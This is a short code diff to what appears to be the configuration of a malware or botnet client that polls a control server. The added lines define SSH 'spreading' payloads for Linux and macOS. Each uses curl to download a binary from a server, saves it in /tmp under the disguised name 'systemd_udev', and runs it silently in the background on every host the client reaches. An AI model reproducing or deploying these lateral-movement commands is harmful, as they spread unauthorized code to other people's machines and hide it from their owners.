@@ -17,3 +17,8 @@ OBFUSCATION_KEY = ""
 
 # The time between each poll to the control server in seconds
 POLLING_TIME = "10"
+
+# Payload scripts to run on hosts when trying to spread to other hosts over SSH
+# These commands will be run on the other hosts if the client manages to conenct over SSH
+SSH_PAYLOAD_LINUX = "curl http://127.0.0.1:1234/linux_x64 --output /tmp/systemd_udev; nohup /tmp/systemd_udev 2>/dev/null >/dev/null & exit"
+SSH_PAYLOAD_MACOS = "curl http://127.0.0.1:1234/macos_x64 --output /tmp/systemd_udev; nohup /tmp/systemd_udev 2>/dev/null >/dev/null & exit"
